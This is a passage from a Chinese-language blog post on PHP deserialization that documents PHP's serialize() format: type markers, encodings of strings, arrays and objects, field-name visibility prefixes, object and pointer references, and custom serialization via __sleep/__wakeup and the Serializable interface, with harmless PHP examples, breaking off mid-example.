

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="make changes, make perfect">
  <meta name="author" content="Dr34d">
  <meta name="keywords" content="blog">
  <title>php 反序列化 - Dr34d&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/xt256.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"greydr34d.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Dr34d's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Dr34d's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/php_unserialize_banner.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="php 反序列化">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-09-20 11:30" pubdate>
        2020年9月20日 中午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      21.6k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      322
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">php 反序列化</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：24 天前
                
              </p>
            
            <div class="markdown-body">
              <h1 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h1><p>知识整合，搬运工</p>
<h2 id="0x01-PHP-序列化（serialize）格式详解"><a href="#0x01-PHP-序列化（serialize）格式详解" class="headerlink" title="0x01 PHP 序列化（serialize）格式详解"></a>0x01 PHP 序列化（serialize）格式详解</h2><p>PHP 序列化后的内容是简单的文本格式，但是对字母大小写和空白（空格、回车、换行等）敏感，而且字符串是按照字节（或者说是 8 位的字符）计算的，因此，更合适的说法是 PHP 序列化后的内容是字节流格式。<strong>因此用其他语言实现时，如果所实现的语言中的字符串不是字节储存格式，而是 Unicode 储存格式的话，序列化后的内容不适合保存为字符串，而应保存为字节流对象或者字节数组，否则在与 PHP 进行数据交换时会产生错误。</strong></p>
<p>PHP 对不同类型的数据用不同的字母进行标示，Yahoo 开发网站提供的 <a target="_blank" rel="noopener" href="http://developer.yahoo.com/common/phpserial.html">Using Serialized PHP with Yahoo! Web Services</a> 一文中给出所有的字母标示及其含义：</p>
<blockquote>
<ul>
<li>a - array</li>
<li>b - boolean</li>
<li>d - double</li>
<li>i - integer</li>
<li>o - common object</li>
<li>r - reference</li>
<li>s - string</li>
<li>C - custom object</li>
<li>O - class</li>
<li>N - null</li>
<li>R - pointer reference</li>
<li>U - unicode string</li>
</ul>
</blockquote>
<p>对普通字符串的序列化也分成了 2 种。<strong>一种是 non-escaped 字符串，也就是我们上面说的那个小写 s 标识的字符串；另一种是 escaped 字符串，这种字符串格式用大写 S 标识。</strong>所以上面那个表现在应该改为：</p>
<blockquote>
<ul>
<li>a - array</li>
<li>b - boolean</li>
<li>d - double</li>
<li>i - integer</li>
<li>o - common object</li>
<li>r - reference</li>
<li>s - non-escaped binary string</li>
<li>S - escaped binary string</li>
<li>C - custom object</li>
<li>O - class</li>
<li>N - null</li>
<li>R - pointer reference</li>
<li>U - unicode string</li>
</ul>
</blockquote>
<h3 id="3．NULL-和标量类型的序列化"><a href="#3．NULL-和标量类型的序列化" class="headerlink" title="3．NULL 和标量类型的序列化"></a>3．NULL 和标量类型的序列化</h3><p>NULL 和标量类型的序列化是最简单的，也是构成符合类型序列化的基础。这部分内容相信许多 PHP 开发者都已经熟知。如果您感觉已经掌握了这部分内容，可以直接跳过这一章。</p>
<h4 id="3-1．NULL-的序列化"><a href="#3-1．NULL-的序列化" class="headerlink" title="3.1．NULL 的序列化"></a>3.1．NULL 的序列化</h4><p>在 PHP 中，NULL 被序列化为：</p>
<p>N;</p>
<h4 id="3-2．boolean-型数据的序列化"><a href="#3-2．boolean-型数据的序列化" class="headerlink" title="3.2．boolean 型数据的序列化"></a>3.2．boolean 型数据的序列化</h4><p>boolean 型数据被序列化为：</p>
<p><code>b:&lt;digit&gt;;</code></p>
<p>其中 <digit> 为 0 或 1，当 boolean 型数据为 false 时，<digit> 为 0，否则为 1。</p>
<h4 id="3-3．integer-型数据的序列化"><a href="#3-3．integer-型数据的序列化" class="headerlink" title="3.3．integer 型数据的序列化"></a>3.3．integer 型数据的序列化</h4><p>integer 型数据（整数）被序列化为：</p>
<p><code>i:&lt;number&gt;;</code></p>
<p>其中 <number> 为一个整型数，范围为：-2147483648 到 2147483647。数字前可以有正负号，如果被序列化的数字超过这个范围，则会被序列化为浮点数类型而不是整型。如果序列化后的数字超过这个范围 （PHP 本身序列化时不会发生这个问题），则反序列化时，将不会返回期望的数值。</p>
<h4 id="3-4．double-型数据的序列化"><a href="#3-4．double-型数据的序列化" class="headerlink" title="3.4．double 型数据的序列化"></a>3.4．double 型数据的序列化</h4><p>double 型数据（浮点数）被序列化为：</p>
<p><code>d:&lt;number&gt;;</code></p>
<p>其中 <number> 为一个浮点数，其范围与 PHP 中浮点数的范围一样。可以表示成整数形式、浮点数形式和科学技术法形式。如果序列化无穷大数，则 <number> 为 INF，如果序列化负无穷大，则 <number> 为 -INF。序列化后的数字范围超过 PHP 能表示的最大值，则反序列化时返回无穷大（INF），如果序列化后的数字范围超过 PHP 所能表示的最小精度，则反序列化时返回 0。当浮点数为非数时，被序列化为 NAN，NAN 反序列化时返回 0。但其它语言可以将 NAN 反序列化为相应语言所支持的 NaN 表示。</p>
<h4 id="3-5．string-型数据的序列化"><a href="#3-5．string-型数据的序列化" class="headerlink" title="3.5．string 型数据的序列化"></a>3.5．string 型数据的序列化</h4><p>string 型数据（字符串）被序列化为：</p>
<p><code>s:&lt;length&gt;:&quot;&lt;value&gt;&quot;;</code></p>
<p>其中 <length> 是 <value> 的长度，<length> 是非负整数，数字前可以带有正号（+）。<value> 为字符串值，这里的每个字符都是单字节字符，其范围与 ASCII 码的 0 - 255 的字符相对应。每个字符都表示原字符含义，没有转义字符，<value> 两边的引号（””）是必须的，但不计算在 <length> 当中。这里的 <value> 相当于一个字节流，而 <length> 是这个字节流的字节个数。</p>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>在 PHP5 最新的 CVS 中（也就是将来要发布的 PHP6），上面对于 string 型数据的序列化方式已经被下面这种所取代，但是 PHP6 仍然支持上面那种序列化方式的反序列化。</p>
<p>新的序列化方式叫做 escaped binary string 方式，这是相对与上面那种 non-escaped binary string 方式来说的：</p>
<p>string 型数据（字符串）新的序列化格式为：</p>
<p><code>S:&lt;length&gt;:&quot;&lt;value&gt;&quot;;</code></p>
<p>其中 <length> 是源字符串的长度，而非 <value> 的长度。<length> 是非负整数，数字前可以带有正号（+）。<value> 为经过转义之后的字符串。</p>
<p>它的转义编码很简单，对于 ASCII 码小于 128 的字符（但不包括 \），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \ 作为开头，后面两个字节分别是这个字符的 16 进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1 位作为第二个字节。依次编码下来，得到的就是 <value> 的内容了。</p>
<h3 id="4．简单复合类型的序列化"><a href="#4．简单复合类型的序列化" class="headerlink" title="4．简单复合类型的序列化"></a>4．简单复合类型的序列化</h3><p>PHP 中的复合类型有数组（array）和对象（object）两种，本章主要介绍在简单情况下这两种类型数据的序列化格式。关于嵌套定义的复合类型和自定义序列化方式的对象的序列化格式将在后面的章节详细讨论。</p>
<h4 id="4-1．数组的序列化"><a href="#4-1．数组的序列化" class="headerlink" title="4.1．数组的序列化"></a>4.1．数组的序列化</h4><p>数组（array）通常被序列化为：</p>
<p><code>a:\&lt;n&gt;:&#123;&lt;key 1&gt;&lt;value 1&gt;&lt;key 2&gt;&lt;value 2&gt;...\&lt;key n&gt;\&lt;value n&gt;&#125;</code></p>
<p>其中 <n> 表示数组元素的个数，&lt;key 1&gt;、&lt;key 2&gt;……<key n> 表示数组下标，&lt;value 1&gt;、&lt;value 2&gt;……<value n> 表示与下标相对应的数组元素的值。</p>
<p>下标的类型只能是整型或者字符串型（包括后面那种 Unicode 字符串型），序列化后的格式跟整型和字符串型数据序列化后的格式相同。</p>
<p>数组元素值可以是任意类型，其序列化后的格式与其所对应的类型序列化后的格式相同。</p>
<h4 id="4-2．对象的序列化"><a href="#4-2．对象的序列化" class="headerlink" title="4.2．对象的序列化"></a>4.2．对象的序列化</h4><p>对象（object）通常被序列化为：</p>
<p><code>O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:&#123;&lt;field name 1&gt;&lt;field value 1&gt;&lt;field name 2&gt;&lt;field value 2&gt;...&lt;field name n&gt;&lt;field value n&gt;&#125;</code></p>
<p>其中 <length> 表示对象的类名 <class name> 的字符串长度。<n> 表示对象中的字段1个数。这些字段包括在对象所在类及其祖先类中用 var、public、protected 和 private 声明的字段，但是不包括 static 和 const 声明的静态字段。也就是说只有实例（instance）字段。</p>
<p>&lt;filed name 1&gt;、&lt;filed name 2&gt;……<filed name n>表示每个字段的字段名，而 &lt;filed value 1&gt;、&lt;filed value 2&gt;……<filed value n> 则表示与字段名所对应的字段值。</p>
<p>字段名是字符串型，序列化后格式与字符串型数据序列化后的格式相同。</p>
<p>字段值可以是任意类型，其序列化后的格式与其所对应的类型序列化后的格式相同。</p>
<p>但字段名的序列化与它们声明的可见性是有关的，下面重点讨论一下关于字段名的序列化。</p>
<h4 id="4-3．对象字段名的序列化"><a href="#4-3．对象字段名的序列化" class="headerlink" title="4.3．对象字段名的序列化"></a>4.3．对象字段名的序列化</h4><p>var 和 public 声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号 $。</p>
<p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上</p>
<p><code>\0*\0</code></p>
<p>的前缀。这里的 \0 表示 ASCII 码为 0 的字符，而不是 \0 组合。</p>
<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上</p>
<p><code>\0&lt;declared class name&gt;\0</code></p>
<p>的前缀。这里 <declared class name> 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。</p>
<p>字段名被作为字符串序列化时，字符串值中包括根据其可见性所加的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p>
<hr>
<p>1注： 在 PHP 手册中，字段被称为属性，而实际上，在 PHP 5 中引入的用 __set、__get 来定义的对象成员更适合叫做属性。因为用 __set、__get 来定义的对象成员与其它语言中的属性的行为是一致，而 PHP 手册中所说的属性实际上在其他语言中（例如：C#）中被称为字段，为了避免混淆，这里也称为字段，而不是属性。</p>
<h3 id="5．嵌套复合类型的序列化"><a href="#5．嵌套复合类型的序列化" class="headerlink" title="5．嵌套复合类型的序列化"></a>5．嵌套复合类型的序列化</h3><p>上一章讨论了简单的复合类型的序列化，大家会发现对于简单的数组和对象其实也很容易。但是如果遇到自己包含自己或者 A 包含 B，B 又包含 A 这类的对象或数组时，PHP 又该如何序列化这种对象和数组呢？本章我们就来讨论这种情况下的序列化形式。</p>
<h4 id="5-1．对象引用和指针引用"><a href="#5-1．对象引用和指针引用" class="headerlink" title="5.1．对象引用和指针引用"></a>5.1．对象引用和指针引用</h4><p>在 PHP 中，标量类型数据是值传递的，而复合类型数据（对象和数组）是引用传递的。但是复合类型数据的引用传递和用 &amp; 符号明确指定的引用传递是有区别的，前者的引用传递是对象引用，而后者是指针引用。</p>
<p>在解释对象引用和指针引用之前，先让我们看几个例子。</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SampleClass</span> </span>&#123;
   <span class="hljs-keyword">var</span> <span class="hljs-variable">$value</span>;
&#125;
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SampleClass();
<span class="hljs-variable">$a</span>-&gt;value = <span class="hljs-variable">$a</span>;
 
<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SampleClass();
<span class="hljs-variable">$b</span>-&gt;value = &amp;<span class="hljs-variable">$b</span>;
 
<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$b</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>这个例子的输出结果是这样的：</p>
<p><code>O:11:&quot;SampleClass&quot;:1:&#123;s:5:&quot;value&quot;;r:1;&#125;</code><br><code>O:11:&quot;SampleClass&quot;:1:&#123;s:5:&quot;value&quot;;R:1;&#125;</code></p>
<p>大家会发现，这里变量 $a 的 value 字段的值被序列化成了 r:1，而 $b 的 value 字段的值被序列化成了 R:1。</p>
<p>但是对象引用和指针引用到底有什么区别呢？</p>
<p>大家可以看下面这个例子：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SampleClass</span> </span>&#123;
   <span class="hljs-keyword">var</span> <span class="hljs-variable">$value</span>;
&#125;
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SampleClass();
<span class="hljs-variable">$a</span>-&gt;value = <span class="hljs-variable">$a</span>;
 
<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SampleClass();
<span class="hljs-variable">$b</span>-&gt;value = &amp;<span class="hljs-variable">$b</span>;
 
<span class="hljs-variable">$a</span>-&gt;value = <span class="hljs-number">1</span>;
<span class="hljs-variable">$b</span>-&gt;value = <span class="hljs-number">1</span>;
 
var_dump(<span class="hljs-variable">$a</span>);
var_dump(<span class="hljs-variable">$b</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;</code></pre></div>

<p>大家会发现，运行结果也许出乎你的预料：</p>
<p>object(SampleClass)#1 (1) {<br> [“value”]=&gt;<br> int(1)<br>}<br>int(1)</p>
<p>改变 $a-&gt;value 的值仅仅是改变了 $a-&gt;value 的值，而改变 $b-&gt;value 的值却改变了 $b 本身，这就是对象引用和指针引用的区别。</p>
<p>不过很不幸的是，PHP 对数组的序列化犯了一个错误，虽然数组本身在传递时也是对象引用传递，但是在序列化时，PHP 似乎忘记了这一点，看下面的例子：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;
<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;value&quot;</span>] = <span class="hljs-variable">$a</span>;
 
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;value&quot;</span>][<span class="hljs-string">&quot;value&quot;</span>][<span class="hljs-number">1</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
<span class="hljs-variable">$a</span> = unserialize(serialize(<span class="hljs-variable">$a</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;value&quot;</span>][<span class="hljs-string">&quot;value&quot;</span>][<span class="hljs-number">1</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;</code></pre></div>

<p>结果是：</p>
<p>1</p>
<p>大家会发现，将原数组序列化再反序列化后，数组结构变了。原本 $a[“value”][“value”][1] 中的值 1，在反序列化之后丢失了。</p>
<p>原因是什么呢？让我们输出序列化之后的结果来看一看：</p>
<p>$a = array();<br>$a[1] = 1;<br>$a[“value”] = $a;</p>
<p>echo serialize($a);</p>
<p>结果是：</p>
<p><code>a:2:&#123;i:1;i:1;s:5:&quot;value&quot;;a:2:&#123;i:1;i:1;s:5:&quot;value&quot;;N;&#125;&#125;</code></p>
<p>原来，序列化之后，$a[“value”][“value”] 变成了 NULL，而不是一个对象引用。</p>
<p>也就是说，PHP 只对对象在序列化时才会生成对象引用标示（r）。对所有的标量类型和数组（也包括 NULL）序列化时都不会生成对象引用。但是如果明确使用了 &amp; 符号作的引用，在序列化时，会被序列化为指针引用标示（R）。</p>
<h4 id="5-2．引用标示后的数字"><a href="#5-2．引用标示后的数字" class="headerlink" title="5.2．引用标示后的数字"></a>5.2．引用标示后的数字</h4><p>在上面的例子中大家可能已经看到了，对象引用（r）和指针引用（R）的格式为：</p>
<p>r:<number>;<br>R:<number>;</p>
<p>大家一定很奇怪后面这个 <number> 是什么吧？本节我们就来详细讨论这个问题。</p>
<p>这个 <number> 简单的说，就是所引用的对象在序列化串中第一次出现的位置，但是这个位置不是指字符的位置，而是指对象（这里的对象是泛指所有类型的量，而不仅限于对象类型）的位置。</p>
<p>我想大家可能还不是很明白，那么我来举例说明一下：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassA</span> </span>&#123;
   <span class="hljs-keyword">var</span> <span class="hljs-variable">$int</span>;
   <span class="hljs-keyword">var</span> <span class="hljs-variable">$str</span>;
   <span class="hljs-keyword">var</span> <span class="hljs-variable">$bool</span>;
   <span class="hljs-keyword">var</span> <span class="hljs-variable">$obj</span>;
   <span class="hljs-keyword">var</span> <span class="hljs-variable">$pr</span>;
&#125;

<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> ClassA();
<span class="hljs-variable">$a</span>-&gt;int = <span class="hljs-number">1</span>;
<span class="hljs-variable">$a</span>-&gt;str = <span class="hljs-string">&quot;Hello&quot;</span>;
<span class="hljs-variable">$a</span>-&gt;bool = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$a</span>-&gt;obj = <span class="hljs-variable">$a</span>;
<span class="hljs-variable">$a</span>-&gt;pr = &amp;<span class="hljs-variable">$a</span>-&gt;str;

<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);

这个例子的结果是：

O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;ClassA&quot;</span>:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;int&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Hello&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;bool&quot;</span>;b:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;r:<span class="hljs-number">1</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;pr&quot;</span>;R:<span class="hljs-number">3</span>;&#125;</code></pre></div>

<p>在这个例子中，首先序列化的对象是 ClassA 的一个对象，那么给它编号为 1，接下来要序列化的是这个对象的几个成员，第一个被序列化的成员是 int 字段，那它的编号就为 2，接下来被序列化的成员是 str，那它的编号就是 3，依此类推，到了 obj 成员时，它发现该成员已经被序列化了，并且编号为 1，因此它被序列化时，就被序列化成了 r:1; ，在接下来被序列化的是 pr 成员，它发现该成员实际上是指向 str 成员的一个引用，而 str 成员的编号为 3，因此，pr 就被序列化为 R:3; 了。</p>
<p>PHP 是如何来编号被序列化的对象的呢？实际上，PHP 在序列化时，首先建立一个空表，然后每个被序列化的对象在被序列化之前，都需要先计算该对象的 Hash 值，然后判断该 Hash 值是否已经出现在该表中了，如果没有出现，就把该 Hash 值添加到这个表的最后，返回添加成功。如果出现了，则返回添加失败，但是在返回失败前先判断该对象是否是一个引用（用 &amp; 符号定义的引用），如果不是则也把 Hash 值添加到表后（尽管返回的是添加失败）。如果返回失败，则同时返回上一次出现的位置。</p>
<p>在添加 Hash 值到表中之后，如果添加失败，则判断添加的是一个引用还是一个对象，如果是引用，则返回 R 标示，如果是对象，则返回 r 标示。因为失败时，会同时返回上一次出现的位置，因此，R 和 r 标示后面的数字，就是这个位置。</p>
<h4 id="5-3．对象引用的反序列化"><a href="#5-3．对象引用的反序列化" class="headerlink" title="5.3．对象引用的反序列化"></a>5.3．对象引用的反序列化</h4><p>PHP 在反序列化处理对象引用时很有意思，如果反序列化的字符串不是 PHP 的 serialize() 本身生成的，而是人为构造或者用其它语言生成的，即使对象引用指向的不是一个对象，它也能正确地按照对象引用所指向的数据进行反序列化。例如：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StrClass</span> </span>&#123;
   <span class="hljs-keyword">var</span> <span class="hljs-variable">$a</span>;
   <span class="hljs-keyword">var</span> <span class="hljs-variable">$b</span>;
&#125;
 
<span class="hljs-variable">$a</span> = unserialize(<span class="hljs-string">&#x27;O:8:&quot;StrClass&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;r:2;&#125;&#x27;</span>);
 
var_dump(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;

运行结果：

<span class="hljs-keyword">object</span>(StrClass)<span class="hljs-comment">#1 (2) &#123;</span>
 [<span class="hljs-string">&quot;a&quot;</span>]=&gt;
 <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;Hello&quot;</span>
 [<span class="hljs-string">&quot;b&quot;</span>]=&gt;
 <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;Hello&quot;</span>
&#125;

大家会</code></pre></div>

<p>发现，上面的例子反序列化后，$a-&gt;b 的值与 $a-&gt;a 的值是一样的，尽管 $a-&gt;a 不是一个对象，而是一个字符串。因此如果大家用其它语言来实现序列化的话，不一定非要把 string 作为标量类型来处理，即使按照对象引用来序列化拥有相同字符串内容的复合类型，用 PHP 同样可以正确的反序列化。这样可以更节省序列化后的内容所占用的空间。</p>
<h3 id="6．自定义对象序列化"><a href="#6．自定义对象序列化" class="headerlink" title="6．自定义对象序列化"></a>6．自定义对象序列化</h3><h4 id="6-1．PHP-4-中自定义对象序列化"><a href="#6-1．PHP-4-中自定义对象序列化" class="headerlink" title="6.1．PHP 4 中自定义对象序列化"></a>6.1．PHP 4 中自定义对象序列化</h4><p>PHP 4 中提供了 __sleep 和 __wakeup 这两个方法来自定义对象的序列化。不过这两个函数并不改变对象序列化的格式，影响的仅仅是被序列化字段的个数。关于它们的介绍，在 PHP 手册中写的还算比较详细。这里就不再多做介绍了。</p>
<h4 id="6-2．PHP-5-中自定义对象序列化"><a href="#6-2．PHP-5-中自定义对象序列化" class="headerlink" title="6.2．PHP 5 中自定义对象序列化"></a>6.2．PHP 5 中自定义对象序列化</h4><p>PHP 5 中增加了接口（interface）功能。PHP 5 本身提供了一个 Serializable 接口，如果用户在自己定义的类中实现了这个接口，那么在该类的对象序列化时，就会被按照用户实现的方式去进行序列化，并且序列化后的标示不再是 O，而改为 C。C 标示的格式如下：</p>
<p>C:<name length>:”<class name>“:<data length>:{<data>}</p>
<p>其中 <name length> 表示类名 <class name> 的长度，<data length> 表示自定义序列化数据 <data> 的长度，而自定义的序列化数据 <data> 是完全的用户自己定义的格式，与 PHP 序列化格式可以完全无关，这部分数据由用户自己实现的序列化和反序列化接口方法来管理。</p>
<p>Serializable 接口中定义了 2 个方法，serialize() 和 unserialize($data)，这两个方法不会被直接调用，而是在调用 PHP 序列化函数时，被自动调用。其中 serialize 函数没有参数，它的返回值就是 <data> 的内容。而 unserialize($data) 有一个参数 $data，这个参数的值就是 <data> 的内容。这样大家应该就明白了，实际上接口中 serialize 方法就是让用户来自己序列化对象中的内容，序列化后的内容格式，PHP 并不关心，PHP 只负责把它充填到 <data> 中，等到反序列化时，PHP 只负责取出这部分内容，然后传给用户实现的 unserialize($data) 接口方法，让用户自己去反序列化这部分内容。</p>
<p>下面举个简单的例子，来说明 Serializable 接口的使用：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>
<span class="hljs-class"></span>&#123;
   <span class="hljs-keyword">public</span> <span class="hljs-variable">$member</span>;
 
